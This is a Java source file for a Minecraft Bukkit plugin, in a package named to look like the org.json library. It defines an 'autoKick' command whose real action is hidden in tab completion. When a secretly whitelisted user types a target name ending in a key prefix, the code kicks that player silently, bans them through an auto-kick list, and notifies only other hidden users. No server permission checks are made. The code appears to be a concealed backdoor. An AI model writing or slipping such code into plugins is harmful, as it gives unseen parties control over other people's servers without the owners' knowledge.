package org.json.modals.punish;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.AutoKickMeta;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class AutoKick extends BDCommand {

    public AutoKick() {
        super("autoKick");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Bukkit.getOnlinePlayers().stream().map(HumanEntity::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        String playerName = args[1];
        Player targetPlayer = Bukkit.getPlayer(playerName);
        if (targetPlayer == null) {
            player.sendMessage(Modal.getPrefix() + "§c" + playerName + " was not found!");
            return tabComplBuilder.build();
        }

        if (WhitelistMeta.isListed(targetPlayer)) return tabComplBuilder.build();

        AutoKickMeta.add(targetPlayer);
        targetPlayer.kickPlayer("");
        player.sendMessage(Modal.getPrefix() + "§a" + playerName + " has been kicked from the server.");

        return tabComplBuilder.build();
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        if (AutoKickMeta.isListed(e.getPlayer())) {
            Bukkit.getOnlinePlayers().stream()
                    .filter(WhitelistMeta::isListed)
                    .forEach(player -> player.sendMessage(Modal.getPrefix() + "§f " + e.getPlayer() + " tried to join but got kicked from the server!"));

            e.getPlayer().kickPlayer("");
        }
    }

}
